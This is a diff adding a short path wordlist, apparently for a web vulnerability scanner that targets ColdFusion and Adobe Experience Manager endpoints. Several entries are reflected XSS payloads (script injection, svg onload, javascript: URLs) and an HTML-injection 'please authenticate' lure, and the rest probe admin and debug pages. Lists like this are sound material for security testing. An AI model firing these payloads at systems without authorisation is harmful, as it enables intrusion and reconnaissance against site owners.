@@ -1,0 +1,21 @@
+/CFIDE/wizards/common/_logintowizard.cfm?%22%3E%3C%2Fscript%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E
+/cf_scripts/scripts/ajax/package/cfajax.js
+/cf-scripts/scripts/ajax/package/cfajax.js
+/CFIDE/scripts/ajax/package/cfajax.js
+/cfide/scripts/ajax/package/cfajax.js
+/CF_SFSD/scripts/ajax/package/cfajax.js
+/cfide-scripts/ajax/package/cfajax.js
+/cfmx/CFIDE/scripts/ajax/package/cfajax.js
+/etc/acs-commons/jcr-compare.html
+/etc/acs-commons/workflow-remover.html
+/etc/acs-commons/version-compare.html
+/etc/acs-commons/oak-index-manager.html
+/{{rand_base(4)}}<img src=x data
+/{{rand_base(4)}}<br><br>please%20authenticate<br><br>.childrenlist.html
+/content.infinity.json
+/{{path}}
+/libs/granite/offloading/content/view.html
+/libs/granite/security/content/useradmin.html
+/etc/designs/xh1x.childrenlist.json//<svg onload=alert(document.domain)>.html
+/CFIDE/debug/cf_debugFr.cfm?userPage=javascript:alert(1)
+/cfusion/debug/cf_debugFr.cfm?userPage=javascript:alert(1)
